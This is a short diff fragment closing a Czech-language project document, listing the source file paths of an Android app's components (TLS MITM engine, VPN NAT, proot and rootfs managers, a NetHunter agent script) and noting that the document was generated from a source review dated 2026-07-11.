+- Local API: `app/src/main/java/com/linux_core/core/LocalApiServer.kt`
+- MITM engine: `app/src/main/java/com/linux_core/core/TlsMitmEngine.kt`
+- VPN NAT: `app/src/main/java/com/linux_core/core/VpnNatEngine.kt`
+- Rootfs manager: `app/src/main/java/com/linux_core/core/RootfsManager.kt`
+- Agent daemon: `app/src/main/assets/nethunter_agent.py`
+- Proot manager: `app/src/main/java/com/linux_core/core/ProotManager.kt`
+- Network security: `app/src/main/res/xml/network_security_config.xml`
+
+---
+
+*Dokument vygenerován na základě přímého review aktuálních zdrojových souborů a `git diff` proti HEAD (2026-07-11).*
